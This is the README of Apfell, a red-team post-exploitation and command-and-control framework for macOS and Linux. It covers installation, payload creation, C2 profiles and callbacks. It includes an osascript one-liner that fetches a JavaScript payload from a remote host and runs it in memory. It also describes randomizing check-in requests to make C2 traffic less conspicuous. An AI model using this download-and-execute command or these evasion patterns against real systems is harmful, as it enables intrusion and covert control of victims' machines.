# Apfell
A macOS, post-exploit, red teaming framework built with python3 and JavaScript. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout mac and linux based red teaming. This is a work-in-progress as I have free time, so please bear with me.

## Details
Check out my [blog post](https://its-a-feature.github.io/posts/2018/07/bare-bones-apfell-server-code-release/) on the initial release of the framework and what the bare bones content can do.

## Installation

- Get the code from this github:
```bash
git clone https://github.com/its-a-feature/Apfell
```
- Important note: This is made to work with *python 3.5*, so you might have issues if you use a different python3 version. I've managed to adjust the install script and the required versions of python dependencies if you're using python 3.7 (which is what is default installed now when you brew install in macOS), but I don't have any cases for using python versions earlier than 3.5.
- Install and setup the requirements. The setup script will also create a default user `apfell_admin` with a default password `apfell_password` that can be used. It's recommended to change this user's password after installing though. This can be installed and run on both Linux and macOS. 
- On macOS, this requires brew to be installed - if it isn't already installed, I will install it for you.
```bash
# The setup.sh will install postgres and pip3 install the requirements
# If you're on Linux:
cd Apfell && chmod +x setup.sh && sudo ./setup.sh && cd ..
# If you're on macOS (note the lack of sudo!):
cd Apfell & chmod +x setup.sh && ./setup.sh && cd ..

```
- Configure the installation in app/\_\_init\_\_.py. 
```bash
# -------- CONFIGURE SETTINGS HERE -----------
db_name = 'apfell_db'
db_user = 'apfell_user'
db_pass = 'super_secret_apfell_user_password'
# server_ip is what your browser will use to find its way back to this server
# change this to be the IP or domain name of how your operators will reach this server
server_ip = 'localhost'  
listen_port = '80'  # similarly, this is the IP the browser will use to connect back to this apfell server
# this is what IP addresses apfell should bind to locally. leave it as 0.0.0.0 unless you have a reason to specify a specific IP address
listen_ip = '0.0.0.0'  # IP to bind to for the server, 0.0.0.0 means all local IPv4 addresses
ssl_cert_path = './app/ssl/apfell-cert.pem'
ssl_key_path = './app/ssl/apfell-ssl.key'
# To help prevent unauthorized access to your login and register pages, you can use this to restrict only certain IP ranges to access these pages
# By default, it allow all netblocks, but if you wanted to only allow people on your net block, you could do something like
# whitelisted_ip_blocks = ['192.168.0.0/16','10.0.0.0/8'] -- it's important to note that no host bits can be set here
whitelisted_ip_blocks = ['0.0.0.0/0']  # only allow connections from these IPs to the /login and /register pages
# by default this is off, but you can turn it on and the server will use the above ssl_cert_path and ssl_key_path
use_ssl = False
```
## Usage
- Start the server:
```bash
sudo python3 server.py 
[2018-07-16 14:39:14 -0700] [28381] [INFO] Goin' Fast @ https://0.0.0.0:80
```
By default, the server will bind to 0.0.0.0 on port 80. This is an alias meaning that it will be listening on all IPv4 addresses on the machine. You don't actually browse to https://0.0.0.0:80 in your browser. Instead, you'll browse to either https://localhost:80 if you're on the same machine that's running the server, or you can browse to any of the IPv4 addresses on the machine that's running the server. You could also browse to the IP address you specified in `server_ip = 'localhost'` in the installation section.  

- All requests from the browser to the apfell server are dynamic and based on the `server_ip` and `listen_port` you specified in the `app/__init__.py` file. I cannot stress this enough that if you fail to set this to anything other than localhost, you'll have a very rough time accessing anything.

Apfell uses JSON Web Token (JWT) for authentication. When you use the browser (vs the API on the commandline), I store your access and refresh tokens in a cookie. This should be seamless as long as you leave the server running; however, the history of the refresh tokens is saved in memory. So, if you authenticate in the browser, then restart the server, you'll get an access denied error when your access token times out. Just clear your cookie and navigate back to the website.
- Browse to the server with any modern web browser. This is where you can sign in. This url and /register are the ones protected by `whitelisted_ip_blocks` in the `app/__init__.py`. The default username and password here is `apfell_admin` and `apfell_password`.  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_login.png)  

- If you'd like to create a new user, simply click to register  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_register.png)  

- Once you've successfully logged in, you'll see a page like this. I try to update this page with future updates on my current list of todos and point you to additional resources.  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_logged_in.png)  

- You'll notice that in big red letters it says to `Select an Operation!`. You can have multiple operations going at once with disjoint payloads, users, callbacks, c2 profiles, files, and more. Everything you'll be seeing in the UI is related to your `current_operation`, which by default you don't have selected. So, I give you directions on where to go to fix that.  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_select_operations.png)  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_operations_view.png)  

- Once you select one and refresh, you'll see the top change. You can always create new operations with whatever names you want, but once one is created, you can't rename it. Keep that in mind. Also, by default, all new users get added to the `default` operation.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_operation_selected.png)  

- Now you need to create a payload. Head over to `Create Components` and select `Create Base Payload`  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_create_components.png)  

- Here you'll select which c2 profile you want to use (I selected `default` which calls back directly to the apfell server and uses the RESTful endpoints). If you select anything other than the default payload, you will need to go to the `c2 profiles management` page and `start` that profile before your callback will work. Fill out any required parameters. Then select the payload type you want to use. Give the location of where you want the created payload to be saved (`/home/its-a-feature/test.js` in my case) and optionally give the payload a tag. This tag will be used to pre-populate the `description` field when a callback initially checks in using this payload. If you don't put in one, I'll use a generic description for you. Lastly, select which commands you wanted included by default in this payload. You can select as many or as few as you like. I selected to have the `load`, `exit`, and `shell` features initially, and I can load in new commands as I need them. When you hit submit you'll either see an error or a message like:  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_create_payload.png)  
Note: If you don't specify a value, I just pass through the placeholder values.

- What if you want to do something else for your c2 profile? Maybe you don't want your callback posting to `/api/v1.0/callbacks/5/nextTask` since that's a bit on the nose. Well, I've started to implement ways for you to customize this. In the c2 management page you can create new c2 profiles, view all of the files that are currently loaded into the system, download those files, or delete them:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_management.png)

- As you're going through to create new c2 profiles, debugging can be a bit of a pain. So, whenever you start a new c2 profile, I return either the error when it started or the first 10 lines of output (stdout + stderr). Additionally, you can click the status button to poll that running c2 profile and get the next 10 lines of buffered data from it. Now, all of this data is stored in memory for all of your running c2 profiles, so it's fine to print out data while debugging, but once you're ready to use it in actual operations, I suggest that you limit the amount of output.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_c2_output.png)

- The RESTful Patchthrough is an example of something a bit more advanced. It uses a config file and threading to stand up multiple smaller servers (ssl optional on each one) that allow you to have more fine grained control on what endpoints the agent will hit.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_patchthrough_config.png)  
As you can see, this specifies a regex mapping of what these smaller servers are looking for and what they'll pass back to the main Apfell server. For example, with this config, the agent needs to post to `/admin.php?q=#` where `#` is the number of the callback. Since this is regex, the request just actually needs to start with that, but can have anything else following it since it'll be ignored. This allows you much greater control in how you structure your c2 profiles.

- As a special treat for the apfell-jxa payload with the RESTful Patchthrough c2 profile, I've added a way to create variations. Take the following configuration for example when creating a payload:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_patchthrough_example.png)  
You'll notice the need to specify where the ID field is going (in this case it's marked by a `*` and it shows up in the paths, but it can be whatever you want, it's just for substitutions later on). This particular example expects the RESTful Patchthrough c2 server to be listening on port 443, so you'd need to make another `instance` in that above config for that with the specified base endpoints and then stop/start the c2 profile.
There are three additional directives I provide - `(A#)`, `(N#)`, and `(M#)`. These stand for Alphabet, Numeric, and Mixed respectively. I use these directives to adjust every request with different values so that it's not just the same static get request when looking for new data.
For example, in this example, every time the agent checks in for new tasking, it'll make a request to something like `/admin.php?q=5&username=aldiznex`, then `/admin.php?q=5&username=jslzneio`, etc. You can see where it'll generate 8 random letters, and where it'll insert the numeric identifier of the callback.

- Since we just made a payload, it's important to call out that all commands have a tracked 'version'. This version is updated automatically every time the code, help, description, or a parameter changes on a command. When you create a payload, you've stamped in a certain 'version' of that command, so I keep track of which version you stamped in. Additionally, all callbacks have loaded commands (some default ones that are part of the payload, and some that are loaded in at runtime), and each of these also has a specific version. Now, you can probably easy see a scenario where you create a payload, or are part way into an operation, and are unsure if you're using the most update code or not. Well, now you can easily tell. From the payloads management page or from the main callbacks UI you can select to see the loaded commands and versions of commands per payload and per callback.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_loaded_commands_in_callback.png)

- If a command that's loaded into a running callback or that's stamped into a payload is out of date with the latest version on the Apfell server, I try to make it obvious to you:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_outdated_command_in_callback.png)

- Ok, now you have a payload, you need to host it somewhere. You can host it on your infrastructure, or for testing, I can host it with a simple python http web server for you  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_hosted_files.png)  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_host_payload.png)  

- Next, you'll need to actually execute the payload. That's your business, but I do have a one-liner you can execute to run the apfell-jxa payload in memory if you want  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_execute_payload.png)  
```bash
osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('HTTP://192.168.205.151:8080/test.js')),$.NSUTF8StringEncoding)));" 
```

- If you go to the `Operational Views` and select `Active Callbacks` you'll now see your callback check in. You can click interact and start entering commands to interact with your payload  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_interact.png)  

- As you start typing, you'll see command options pop up. You can use your Left/Right arrow keys to move through these and hint Enter for the one you want. You can also just keep typing the full command.  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_command_hints.png)  

- If you're unsure what a command does, you can either type `help {command_name}` to see a brief help syntax or you can go to `api`->`apfell-jxa help` for descriptions and more thorough help.
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_help.png)

- If you're still weary about the command, you can always go to `Manage Operations` -> `Payload Management` and select the `Edit` button under the `Edit Commands` columnn for a given payload type (by default it's just the apfell-jxa payload). Here is where you can select any of the commands and see/edit their actual code and parameters.

- All payload_types (like apfell-jxa) allow you to also set a command template. This template will appear to the operator any time they try to create a new command so that it's more intuitive and straightforward to do so.  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/readme_function_skeleton.png)  



- There still a lot I haven't covered here, but I'll be explaining in a blog post soon
### In-Server Help
Once you've logged into Apfell, you can access some additional help. 
- CommandLines - provides information about how to interact with the RESTful interface via terminal and Curl
- Documentation - will eventually provide a more thorough manual of how Apfell is organized, how to extend it, how logging works, and how to interact with the dashboards
- apfell-jxa help - provides help on the command lines that can be sent to the apfell-jxa RAT, how they work, and their parameters
